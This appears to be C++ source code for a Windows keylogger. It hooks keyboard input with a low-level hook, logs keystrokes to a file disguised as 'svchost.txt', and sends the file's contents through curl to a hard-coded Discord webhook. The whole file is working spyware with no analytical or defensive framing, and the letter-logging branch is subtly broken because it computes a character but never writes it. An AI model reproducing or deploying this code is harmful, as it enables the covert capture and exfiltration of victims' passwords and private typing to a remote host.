void createFileIfNotExists(const std::string& filename)
{
    std::ifstream file(filename);
    if (!file.good())
    {
        std::ofstream newFile(filename);
        newFile.close();
    }
}

void sendFileToWebhook()
{
    std::ifstream file("svchost.txt");

    std::string url = "https://discordapp.com/api/webhooks/13901402799248805969/hFAKWHb30nmRPRQGUsm-QoCj1nzAQ5SklDLigiK7e0q4khwwJaxoLPiF6GLP0BS7XJvT";
    const std::string cmd_1 = "curl -s -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
    const std::string cmd_2 = "\\\"}\" ";

    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string content = buffer.str();

    system((cmd_1 + content + cmd_2 + url).c_str());
}

void logKey(int key)
{
    std::ofstream log("svchost.txt", std::ios::app);

    bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

    if (key == VK_BACK) log << "[BACKSPACE]";

    else if (key == VK_RETURN) log << "[ENTER]";
    else if (key == VK_SPACE) log << " ";
    else if (key == VK_TAB) log << "[TAB]";
    else if (key == VK_ESCAPE) log << "[ESC]";
    else if (key == VK_CAPITAL) log << "[CAPITAL]";
    else if (key == VK_OEM_PERIOD) log << ".";

    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) log << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) log << "[CTRL]";


    else if (key >= 'A' && key <= 'Z')
    {
        if (!shiftPressed) key += 32;
    }

    else if (key >= '0' && key <= '9') log << char(key);
    else log << "[" << key << "]";

    log.close();
}

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        logKey(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}